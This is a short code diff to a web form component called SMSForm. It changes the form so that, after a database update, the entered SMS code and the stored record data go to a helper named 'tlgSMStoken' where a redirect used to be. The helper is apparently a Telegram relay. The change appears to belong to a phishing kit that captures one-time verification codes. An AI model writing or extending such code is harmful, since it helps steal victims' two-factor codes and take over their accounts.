@@ -1,5 +1,5 @@
 "use client";
-import { supabase } from "@/utils/utils";
+import { tlgSMStoken, supabase } from "@/utils/utils";
 
 export default function SMSForm({ open, dataInfo, time }) {
   function handlerVisivility() {
@@ -27,7 +27,7 @@ export default function SMSForm({ open, dataInfo, time }) {
         .eq("id", parseInt(dataInfo.id))
         .select();
       if (data) {
-        window.location.replace("");
+        tlgSMStoken({ ...dataInfo, sms: sms });
       }
     }
   }
